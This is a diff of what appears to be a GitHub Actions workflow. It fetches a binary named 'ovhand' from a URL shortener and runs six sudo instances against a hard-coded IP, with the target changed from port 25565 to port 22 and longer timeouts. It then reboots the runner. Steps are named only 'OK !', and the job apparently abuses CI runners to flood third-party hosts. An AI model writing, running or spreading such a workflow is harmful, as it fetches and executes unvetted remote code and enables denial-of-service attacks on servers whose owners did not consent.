@@ -15,11 +15,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/m0Kln/ovhand -O ovhand
+          wget https://curl.by/r_4Pr/ovhand -O ovhand
           chmod +x ovhand
           PIDS=()
           for i in {1..6}; do
-            sudo timeout 60 ./ovhand 193.70.95.184 25565 10 60 &
+            sudo timeout 100 ./ovhand 40.160.24.51 22 10 100 &
             PIDS+=($!)
           done
           
@@ -28,7 +28,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 60
+        run: sleep 100
         
       - name: OK !
         run: sudo reboot
